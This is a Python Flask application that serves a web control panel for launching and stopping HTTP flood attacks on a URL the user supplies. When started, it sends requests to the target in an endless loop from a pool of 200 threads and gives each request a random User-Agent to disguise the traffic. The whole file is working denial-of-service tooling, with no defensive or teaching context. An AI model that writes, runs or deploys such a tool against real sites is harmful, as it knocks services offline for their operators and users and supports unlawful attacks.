from flask import Flask, request, jsonify, render_template
from concurrent.futures import ThreadPoolExecutor
import urllib.request
from user_agent import generate_user_agent
import os

app = Flask(__name__)
executor = ThreadPoolExecutor(max_workers=200)
tasks = {}
running_urls = {}

def attack(url):
    headers = {'User-Agent': generate_user_agent()}
    try:
        req = urllib.request.urlopen(urllib.request.Request(url, headers=headers))
        return {'status': req.status, 'url': url}
    except Exception as e:
        return {'error': str(e)}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start_attack():
    data = request.json
    url = data.get("url")
    if not url:
        return jsonify({"error": "URL is required."}), 400
    if url in running_urls:
        return jsonify({"message": f"Attack already running for {url}."}), 400

    running_urls[url] = True

    def run_attacks(target_url):
        while running_urls.get(target_url, False):
            executor.submit(attack, target_url)

    executor.submit(run_attacks, url)
    return jsonify({"message": f"Attack started for {url}."})

@app.route('/stop', methods=['POST'])
def stop_attack():
    data = request.json
    url = data.get("url")
    if not url:
        return jsonify({"error": "URL is required."}), 400
    if url in running_urls:
        running_urls[url] = False
        return jsonify({"message": f"Attack stopped for {url}."})
    return jsonify({"error": f"No attack found for {url}."}), 400

@app.route('/status', methods=['GET'])
def status():
    active_urls = [url for url, status in running_urls.items() if status]
    return jsonify({"active_urls": active_urls})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
